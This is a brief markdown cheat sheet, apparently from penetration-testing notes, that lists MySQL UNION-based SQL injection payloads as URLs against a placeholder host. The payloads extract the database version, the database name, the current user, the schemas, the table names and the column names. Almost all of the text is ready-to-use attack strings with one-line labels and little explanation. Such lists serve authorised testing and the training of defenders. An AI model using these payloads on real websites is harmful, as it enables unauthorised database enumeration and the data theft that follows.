# Discover various informations

## MySQL
```bash
# Discover version
http://target.com/path/?id=-1 union select 1, 2, 3, version()

# Discover database name
http://target.com/path/?id=-1 union select 1, 2, 3, database()

# Discover logged in usernames
http://target.com/path/?id=-1 union select 1, 2, 3, current_user()

# Discover databases
http://target.com/path/?id=-1 union select 1, 2, 3, schema_name from information_schema.schemata

# Discover table names of database
http://target.com/path/?id=-1 union select 1, 2, 3, table_name from information_schema.tables where table_schema="database_name"

# Discover columns of database
http://target.com/path/?id=-1 union select 1, 2, 3, column_name from information_schema.columns where table_schema="database_name" and table_name="tablename"
```